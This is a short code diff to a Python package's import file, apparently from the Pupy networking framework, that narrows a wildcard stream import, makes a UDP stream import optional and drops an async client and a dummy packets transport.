@@ -1,14 +1,19 @@
 import logging
 
-from .streams import *
+from .streams.PupySocketStream import PupySocketStream
+
+try:
+    from .streams.PupySocketStream import PupyUDPSocketStream
+except:
+    PupyUDPSocketStream = None
+
 from .base import chain_transports
 from .servers import PupyTCPServer, PupyUDPServer
 from .clients import PupyTCPClient, PupySSLClient
 from .clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
-from .clients import PupyAsyncClient, PupyUDPClient
+from .clients import PupyUDPClient
 
 from .transports.dummy import DummyPupyTransport
-from .transports.dummy_packets import DummyPupyPacketsTransport
 
 try:
     from .transports.rsa_aes import RSA_AESClient, RSA_AESServer
